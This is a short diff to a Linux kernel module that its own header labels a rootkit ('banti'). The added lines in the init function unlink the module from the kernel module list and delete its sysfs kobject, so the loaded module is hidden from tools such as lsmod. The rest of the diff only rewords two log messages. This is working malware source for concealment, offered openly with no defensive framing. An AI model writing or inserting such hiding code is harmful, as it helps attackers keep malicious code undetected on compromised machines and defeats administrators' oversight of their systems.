@@ -14,7 +14,11 @@ Desc:   Kernel Based RootKit Module
 ---------------------------------------------*/
 static int __init banti_kit_init(void)
 {
-    printk(KERN_INFO "Starting banti module!\n");
+	/* Hide module */
+	list_del_init(&__this_module.list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+
+    printk(KERN_INFO "Loades banti module\n");
     return 0;
 }
 
@@ -24,7 +28,7 @@ static int __init banti_kit_init(void)
 ---------------------------------------------*/
 static void __exit banti_kit_clean(void)
 {
-	printk(KERN_INFO "Cleaning up banti module.\n");
+	printk(KERN_INFO "Unloaded banti module\n");
 }
 
 
